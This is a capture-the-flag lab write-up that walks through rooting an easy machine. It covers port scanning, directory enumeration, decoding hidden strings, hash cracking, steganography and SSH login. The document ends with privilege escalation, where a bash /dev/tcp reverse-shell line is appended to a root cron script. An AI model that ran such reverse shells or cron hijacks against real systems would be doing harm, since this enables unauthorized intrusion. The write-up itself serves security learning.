- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Root the Machine .
# Recon

## Nmap

We can use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan oer target :

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
6498/tpc open ssh    OpenSSH
65524/tcp open http  Apache httpd 2.4.43

```

<img src="../../Flameshots/3b3445fefa04e48e5a22fa5fb692f618.png" alt="3b3445fefa04e48e5a22fa5fb692f618.png" width="419" height="203" class="jop-noMdConv">

So we find [NGINX](../../3%20-%20Tags/Hacking%20Concepts/NGINX.md) .
# Enumeration

## Gobuster

We can now use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) :

```
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.192.115/hidden/]
```

<img src="../../Flameshots/7f64f13f52f30a05a82b37c682a8be9c.png" alt="7f64f13f52f30a05a82b37c682a8be9c.png" width="355" height="286">

we can gobuster again the /hidden dir :

```
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.192.115/hidden/whatever/]                                                                                 
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished

```

and if we go to /whatever , in the [Source Code](../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) we can find a hidden text that looks like a [Base64](../../3%20-%20Tags/Hacking%20Concepts/Base64.md) encoded string :

![61ee5d31b7054d4d20342653faf96d06.png](../../2%20-%20Resources/Others/Flameshots/61ee5d31b7054d4d20342653faf96d06.png)

so we decode it :

```
echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
flag{f1rs7_fl4g} 
```

## Further enumerate the machine

we can use again [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to gain info about the other [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) on port 65524 :

<img src="../../Flameshots/4170a189c3da9be085898a1189303d26.png" alt="4170a189c3da9be085898a1189303d26.png" width="371" height="99">

if we go to /robots.txt :

<img src="../../Flameshots/6c888c893523014d86bf0021c73a450f.png" alt="6c888c893523014d86bf0021c73a450f.png" width="398" height="155" class="jop-noMdConv">

### Hash identifier

We can use [HashIdentifier](../../3%20-%20Tags/Hacking%20Tools/HashIdentifier.md) to [Decipher](../../3%20-%20Tags/Hacking%20Concepts/Decipher.md) :

```
hash-identifier a18672860d0510e5ab6699730763b250

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

<img src="../../Flameshots/33cd5c9637fd4a90f965375a0b2b96b6.png" alt="33cd5c9637fd4a90f965375a0b2b96b6.png" width="520" height="290" class="jop-noMdConv">

and now if we go to the main page on port 65524 and in the [Source Code](../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) we find flag3 in clear text:

<img src="../../Flameshots/06daf159a86267455a39ff70c83bf8c4.png" alt="06daf159a86267455a39ff70c83bf8c4.png" width="383" height="100">

on the same page we find what looks like another string that we need [Decoding](../../3%20-%20Tags/Hacking%20Concepts/Decoding.md). The hint says: “its encoded with ba..”

![3109e8fb4fa41289d7ea1148473eeae0.png](../../2%20-%20Resources/Others/Flameshots/3109e8fb4fa41289d7ea1148473eeae0.png)

if we decode it in [Base62](../../3%20-%20Tags/Hacking%20Concepts/Base62.md) we notice it's a hidden directory : 

<img src="../../Flameshots/dcb1b33e4bf4d36f97453ad4d6204191.png" alt="dcb1b33e4bf4d36f97453ad4d6204191.png" width="528" height="332">

When we visit this directory, we are greeted with a page with a picture once again. we save the image and check it with [Steghide](../../3%20-%20Tags/Hacking%20Tools/Steghide.md). We are requested a password for this. The page source reveals another [Hash](../../3%20-%20Tags/Hacking%20Concepts/Hash.md) that we will need to crack. We are provided with a wordlist and a hint on what format the hash is. Time to fire up [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```html
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
```

### John The Ripper

```
sudo john --wordlist=easypeasy_pass.txt --format=gost hash2    
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)     
1g 0:00:00:00 DONE (2025-07-09 15:51) 50.00g/s 257050p/s 257050c/s 257050C/s vgazoom4x..sunshine
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### Steghide

we can use the cracked passwd to extract from the image with [Steghide](../../3%20-%20Tags/Hacking%20Tools/Steghide.md) :

```Kali
steghide --extract -sf binarycodepixabay.jpg  
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```

and we find a [Binary](../../3%20-%20Tags/Programming%20Languages/Binary.md) text :

```
cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

and converting from binary to English text :

![f983327bce5868a109bc34dcd6cbb0c3.png](../../2%20-%20Resources/Others/Flameshots/f983327bce5868a109bc34dcd6cbb0c3.png)

# First Access
## SSH

now with this passwd we can access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with the username : boring and the cracked passwd (on port 6498 see nmap_scan) :

```
ssh boring@10.10.192.115 -p 6498             
The authenticity of host '[10.10.192.115]:6498 ([10.10.192.115]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.192.115]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.192.115's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ 

```

when we read the file, it seems our [Flag](../../3%20-%20Tags/Hacking%20Concepts/Flag.md) got a bit messed up! The hint says it got rotated. We can easily find an online [ROT](../../3%20-%20Tags/Hacking%20Concepts/ROT.md) decrypter. It turns out its rot -13.

<span style="color: rgb(45, 194, 107);">**flag{n0wits33msn0rm4l}**</span>

# Privilege Escalation

Now we can do [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md), we check crontabs we see there's a cronjob we can replace with a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) :

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

```

if we cat it , we can read it will run as root .

## Reverse shell

### Netcat 

Time to [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) this! I start with setting up my [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and then I add a [Bash](../../3%20-%20Tags/Hacking%20Concepts/Bash.md) [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) (from pentestmonkeys) to the cronjob file:

```Kali
nc -lvnp 1234         
listening on [any] 1234 ..
```

```
boring@kral4-PC:/var/www$ echo "bash -i >& /dev/tcp/10.8.162.183:1234 0>&1" >> .mysecretcronjob.sh
```

and we cat the root flag.

Pwned !!